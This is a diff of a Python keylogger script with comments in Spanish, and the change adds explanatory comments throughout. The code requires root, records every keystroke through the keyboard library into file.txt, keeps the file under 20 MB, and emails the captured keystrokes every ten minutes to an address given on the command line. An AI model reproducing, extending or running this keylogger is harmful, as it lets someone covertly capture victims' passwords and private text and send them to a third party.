@@ -5,8 +5,7 @@ import ssl
 import re
 from email.message import EmailMessage
 
-# CONTROL DE ERRORES
-
+# imprimimos un mensaje
 def imprimir_mensaje(ayuda):
     for c in ayuda:
         sys.stdout.write(c)
@@ -14,6 +13,7 @@ def imprimir_mensaje(ayuda):
         time.sleep(0.02)
     print("\n")
 
+# con estas condiciones nos aseguramos de que el paso de parámetros se realice de forma correcta
 if os.getuid() != 0:
     ayuda = """
         Debes ejecutar este script como root o con permisos de administrador.
@@ -41,16 +41,17 @@ elif not (re.match(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", sys.argv[
     imprimir_mensaje(ayuda)
     sys.exit(1)
 
-# Define email sender and receiver
+# Se guardan los parametros pasados por terminal (el correo emisor, receptor y la contraseña)
 email_sender = sys.argv[1] # Email del emisor
 email_password = sys.argv[2] # Password del emisor
 email_receiver = sys.argv[3] # Email del receptor
 
-# Set the filename of the email
+# Guardamos el nombre del archivo donde se almacenarán las pulsaciones de las teclas
 filename = 'file.txt'
 
-inicio = time.time()
+inicio = time.time() # se inicia el temporizador para que se pueda calcular los 10minutos para el envío del correo
 
+# Se guardan los parámetros necesarios para el envío del correo
 def detalles_envio():
     em = EmailMessage()
     em['From'] = email_sender
@@ -62,6 +63,7 @@ def detalles_envio():
     context = ssl.create_default_context()
     return em, context
 
+# Se envía el correo a través del método sendmail
 def sendMail():
     sw = True
     while sw:
@@ -75,6 +77,7 @@ def sendMail():
         except:
             pass
 
+# Se calcula el tiempo de tal manera que si han pasado 10min se envíe el correo
 def file_modif_and_time():
     global inicio
     file_stats = os.stat("file.txt")
@@ -82,6 +85,7 @@ def file_modif_and_time():
         inicio = time.time()
         sendMail()
 
+# Se calcula el size del archivo para que no supere los 20mb
 def size_f():
     global inicio
     file_stats = os.stat("file.txt")
@@ -92,6 +96,7 @@ def size_f():
             f.close()
         inicio = time.time()
 
+# Se capturan las teclas
 def reg_keys():
     while True:
         event = keyboard.read_event()
@@ -103,11 +108,13 @@ def reg_keys():
             size_f()
             file_modif_and_time()
 
+# Se comprueba si el archivo está creado o no en el sistema
 def create_file():
     if not os.path.exists('file.txt'):
         file=open("file.txt", "w")
         file.close()
 
+# Se llama a las demás funciones
 def main():
     create_file()
     reg_keys()
